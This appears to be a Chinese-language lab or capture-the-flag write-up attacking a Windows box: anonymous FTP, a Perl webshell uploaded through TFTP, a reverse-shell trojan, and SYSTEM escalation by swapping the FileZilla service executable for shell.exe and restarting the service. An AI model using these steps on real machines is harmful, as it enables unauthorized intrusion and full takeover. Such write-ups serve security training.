# nmap 

```
21/tcp open  ftp
22/tcp open  ssh
23/tcp open  telnet
69/udp open  tftp
80/tcp open  http
```

### ftp

ftp可以匿名登录

```
ftp Anonymous@192.168.137.147
```

tftp可以上传文件，上传目录为默认为root目录，web端可以访问上传的内容

cgi程序识别python,c++,perl语言，分别上传不同语言的webshell，上传至/cgi-bin目录下，只有perl可以识别，perl脚本位置D:\CTF\WEB\Trojan\perl=web-shell

然后使用msf生成反弹shell木马，上传之后使用webshell交互运行木马，即可反弹shell

# windows提权

```
tasklist -V | findstr SYSTEM
查找系统权限运行的服务
System Idle Process            0 Console                 0         28 K Running         NT AUTHORITY\SYSTEM                                     7:55:56 N/A                                                                     
System                         4 Console                 0    100,160 K Running         NT AUTHORITY\SYSTEM                                     0:00:03 N/A                                                                     
smss.exe                     468 Console                 0        388 K Running         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
csrss.exe                    580 Console                 0      3,916 K Running         NT AUTHORITY\SYSTEM                                     0:00:01 N/A                                                                     
winlogon.exe                 604 Console                 0      5,384 K Running         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
services.exe                 704 Console                 0      3,156 K Running         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
lsass.exe                    716 Console                 0      1,332 K Running         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
svchost.exe                  876 Console                 0      4,652 K Running         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
svchost.exe                 1096 Console                 0     17,092 K Running         NT AUTHORITY\SYSTEM                                     0:00:03 N/A                                                                     
avgchsvx.exe                1336 Console                 0        288 K Running         NT AUTHORITY\SYSTEM                                     0:00:08 N/A                                                                     
avgrsx.exe                  1344 Console                 0        508 K Running         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
avgcsrvx.exe                1588 Console                 0        344 K Running         NT AUTHORITY\SYSTEM                                     0:00:06 N/A                                                                     
spoolsv.exe                 1936 Console                 0      4,428 K Running         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
avgwdsvc.exe                 840 Console                 0      2,076 K Running         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
FileZilla server.exe         992 Console                 0      2,976 K Running         NT AUTHORITY\SYSTEM                                     0:00:00 CAsyncSocketEx Helper Window                                            
FreeSSHDService.exe         1048 Console                 0      4,512 K Running         NT AUTHORITY\SYSTEM                                     0:00:00 FreeSSHDService                                                         
OpenTFTPServerMT.exe        1156 Console                 0      1,856 K Running         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
cmd.exe                     2716 Console                 0      2,348 K Running         NT AUTHORITY\SYSTEM                                     0:00:00 C:\WINDOWS\System32\svchost.exe                                         

```

系统权限运行了

FileZilla server FTP server

将该服务的运行程序改为webshell,重启该服务，将会以系统权限运行，返回系统权限的shell

```
C:\Program Files\FileZilla Server>move "FileZilla Server.exe" "FileZilla Server.exe.bak" 进行备份
C:\Program Files\FileZilla Server>move "shell.exe" "FileZilla Server.exe"
C:\Program Files\FileZilla Server>net stop "FileZilla Server FTP service"
C:\Program Files\FileZilla Server>net start "FileZilla Server FTP service"
```

